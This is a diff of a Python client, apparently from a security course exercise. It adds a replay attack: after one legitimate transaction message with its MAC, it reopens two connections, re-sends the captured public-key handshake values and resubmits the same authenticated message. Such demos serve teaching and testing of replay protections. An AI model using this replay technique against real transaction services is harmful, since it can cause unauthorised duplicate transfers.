@@ -44,15 +44,38 @@ def transaccion(origen, destino, cantidad):
 
     #with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     #    s.connect((HOST, PORT))
-        s.sendall(bytes(mensaje + str(mac), 'utf-8'))
-        
-        
-        print("¡ Ataque REPLAY iniciado !")
+        print("Primera petición (legítima)")
         s.sendall(bytes(mensaje + str(mac), 'utf-8'))
         data2 = s.recv(1024)
         print(f"Received:\n"+ data2.decode('utf-8'))
+        time.sleep(3)
 
-        time.sleep(5)
+    print("¡ Ataque REPLAY iniciado !")
+        
+    # Los ataques no solo reenvían la info
+    # sino que también emulan el handshake de claves inicial
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+        
+        print("¡ Ataque 1 !")
+        s.sendall(bytes(str(publicKey_n), 'utf-8'))
+        time.sleep(1)
+        s.sendall(bytes(str(publicKey_e), 'utf-8'))
+        time.sleep(1)
+        s.recv(1024)
+        s.sendall(bytes(mensaje + str(mac), 'utf-8'))
+        data2 = s.recv(1024)
+        print(f"Received:\n"+ data2.decode('utf-8'))
+        time.sleep(3)
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+        print("¡ Ataque 2 !")
+        s.sendall(bytes(str(publicKey_n), 'utf-8'))
+        time.sleep(1)
+        s.sendall(bytes(str(publicKey_e), 'utf-8'))
+        time.sleep(1)
+        s.recv(1024)
         s.sendall(bytes(mensaje + str(mac), 'utf-8'))
         data2 = s.recv(1024)
         print(f"Received:\n"+ data2.decode('utf-8'))
